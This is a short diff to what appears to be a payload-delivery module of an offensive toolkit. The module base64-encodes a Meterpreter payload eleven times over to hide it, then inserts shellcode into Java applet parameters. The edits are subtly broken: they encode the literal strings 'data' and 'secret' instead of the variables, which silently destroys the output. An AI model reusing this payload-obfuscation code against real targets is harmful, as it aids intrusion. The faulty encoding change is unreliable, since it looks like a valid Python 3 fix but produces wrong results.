@@ -488,30 +488,30 @@ try:
                     if payloadgen != "solo":
                         # base64 1
                         data = str(data)
-                        data = base64.b64encode(data)
+                        data = base64.b64encode(b'data')
                         # encode it again for the fun 2
-                        data = base64.b64encode(data)
+                        data = base64.b64encode(b'data')
                         # again 3
-                        data = base64.b64encode(data)
+                        data = base64.b64encode(b'data')
                         # again 4
-                        data = base64.b64encode(data)
+                        data = base64.b64encode(b'data')
                         # again 5
-                        data = base64.b64encode(data)
+                        data = base64.b64encode(b'data')
                         # again 6
-                        data = base64.b64encode(data)
+                        data = base64.b64encode(b'data')
                         # again 7
-                        data = base64.b64encode(data)
+                        data = base64.b64encode(b'data')
                         # again 8
-                        data = base64.b64encode(data)
+                        data = base64.b64encode(b'data')
                         # 9
-                        data = base64.b64encode(data)
+                        data = base64.b64encode(b'data')
                         # 10
-                        data = base64.b64encode(data)
+                        data = base64.b64encode(b'data')
                         # last one
-                        data = base64.b64encode(data)
+                        data = base64.b64encode(b'data')
                         #
                     filewrite = open("%s/meterpreter.alpha" % (setdir), "w")
-                    filewrite.write(data)
+                    filewrite.write(str(data))
                     filewrite.close()
                     if choice1 == "shellcode/alphanum":
                         print_status("Prepping shellcodeexec for delivery..")
@@ -555,10 +555,10 @@ try:
                         data = data.replace(
                             'param name="2" value=""', 'param name="2" value="%s"' % (alpha_shellcode))
                         if choice1 == "shellcode/multipyinject":
-                            secret = base64.b64encode(secret)
+                            secret = base64.b64encode(b'secret')
                             data = data.replace(
                                 'param name="10" value=""', 'param name="10" value ="%s"' % (secret))
-                        filewrite.write(data)
+                        filewrite.write(str(data))
 
                         # close file
                         filewrite.close()
